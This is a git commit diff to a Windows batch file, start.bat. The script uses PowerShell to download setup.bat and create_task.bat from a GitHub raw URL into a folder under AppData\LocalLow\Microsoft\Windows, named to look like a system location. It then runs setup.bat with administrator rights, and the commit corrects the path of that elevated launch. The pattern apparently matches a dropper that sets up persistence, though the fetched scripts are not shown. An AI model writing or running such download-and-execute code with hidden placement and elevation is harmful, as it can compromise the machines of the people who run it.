6e6fbff13d8f2c9ecd36d6936288b669e7d5f699
¨ABYSSALVOID¨ <abyssalvoid@yandex.com>
2019-11-28 14:44:03 -0200

    fix path

--- start.bat
+++ start.bat
@@ -2,6 +2,6 @@
 
 	powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/setup.bat', '%USERPROFILE%\AppData\LocalLow\Microsoft\Windows\setup.bat')"
 	powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\Microsoft\Windows\create_task.bat')"
-	powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\Microsoft\Windows\sys32\setup.bat' -Verb runAs"
+	powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\Microsoft\Windows\setup.bat' -Verb runAs"
 	pause
 	exit /b 0
